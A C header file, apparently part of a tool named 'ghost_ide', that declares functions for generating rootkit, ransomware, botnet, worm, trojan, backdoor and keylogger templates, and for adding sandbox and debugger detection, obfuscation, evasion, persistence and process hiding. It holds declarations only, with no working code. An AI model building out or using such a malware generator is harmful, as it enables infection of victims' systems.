#ifndef MALWARE_TEMPLATES_H
#define MALWARE_TEMPLATES_H

#include <stdint.h>
#include <stdbool.h>
#include "ghost_ide.h"

// Malware Capabilities
#define CAP_PERSISTENCE       0x01
#define CAP_STEALTH          0x02
#define CAP_ANTI_ANALYSIS    0x04
#define CAP_ENCRYPTED_COMMS  0x08
#define CAP_SELF_MODIFY      0x10
#define CAP_ANTI_REMOVAL     0x20
#define CAP_SPREADING        0x40
#define CAP_PAYLOAD          0x80

// Template Generation Functions
void generate_rootkit_template(char* template);
void generate_ransomware_template(char* template);
void generate_botnet_template(char* template);
void generate_worm_template(char* template);
void generate_trojan_template(char* template);
void generate_backdoor_template(char* template);
void generate_keylogger_template(char* template);

// Anti-Analysis Features
void add_anti_analysis_code(char* template);
void add_vm_detection(char* template);
void add_debugger_detection(char* template);
void add_sandbox_detection(char* template);

// Encryption Features
void add_encryption_layer(char* template);
void add_string_encryption(char* template);
void add_comms_encryption(char* template);
void add_payload_encryption(char* template);

// Obfuscation Features
void add_code_obfuscation(char* template);
void add_control_flow_obfuscation(char* template);
void add_data_obfuscation(char* template);
void add_api_obfuscation(char* template);

// Evasion Techniques
void generate_evasion_techniques(char* template);
void add_timing_evasion(char* template);
void add_behavior_evasion(char* template);
void add_signature_evasion(char* template);

// Persistence Methods
void add_persistence_methods(char* template);
void add_boot_persistence(char* template);
void add_registry_persistence(char* template);
void add_service_persistence(char* template);

// Stealth Features
void add_stealth_features(char* template);
void add_process_hiding(char* template);
void add_file_hiding(char* template);
void add_network_hiding(char* template);

#endif // MALWARE_TEMPLATES_H
